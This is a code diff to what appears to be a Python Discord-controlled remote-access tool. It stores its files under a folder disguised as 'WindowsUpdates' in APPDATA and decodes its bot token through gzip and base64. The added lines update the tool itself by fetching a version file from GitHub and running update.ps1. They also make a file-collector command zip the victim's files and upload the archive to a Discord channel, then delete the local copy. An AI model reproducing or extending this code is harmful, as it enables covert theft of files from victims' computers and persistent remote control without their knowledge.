@@ -42,6 +42,12 @@ def get_raw_git_content(url):
     r = requests.get(url)
     return r.text
 
+if config["Settings"]["version"] != get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", ""):
+    subprocess.call("./update.ps1")
+    quit()
+elif file_version == get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", "") and config["Settings"]["version"] != get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", ""):
+    config["Settings"]["version"] = get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", "")
+
 @client.event
 async def on_ready():
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
@@ -495,12 +501,14 @@ async def on_message(message):
         #run file_collector.pyw and wait until finished then send collected_files.zip
         os.system(f"py {os.getcwd()}\\built_in_modules\\file_collector.pyw")
 
-        embed = discord.Embed(title="File Collector", description="File collector executed.", color=0x00ff00)
-        
+        embed = discord.Embed(title="File Collector", description="File collector executed.\nNOTE: If you have enabled image collection, .zip file size may be too big to send!", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
         while(os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip") == False):
             time.sleep(1)
 
-        await message.channel.send(embed=embed)
+        await message.channel.send(file=discord.File(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip"))
+        os.remove(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip")
         
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
